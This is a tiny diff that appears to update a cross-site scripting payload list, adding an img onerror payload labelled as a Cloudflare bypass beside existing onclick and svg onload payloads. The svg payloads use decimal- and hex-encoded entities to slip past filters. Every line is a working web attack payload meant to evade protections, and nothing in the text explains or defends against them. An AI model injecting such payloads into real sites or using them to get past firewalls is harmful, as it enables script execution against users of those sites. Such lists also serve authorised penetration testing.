@@ -1,3 +1,4 @@
+<img+src%3dOnXSS+OnError%3dalert('XSs-Cloudflare-bypass-By-Dedi')>
 <a"/onclick=(confirm)()>Click Here!
 Dec: <svg onload=prompt%26%230000000040document.domain)>
 Hex: <svg onload=prompt%26%23x000000028;document.domain)>
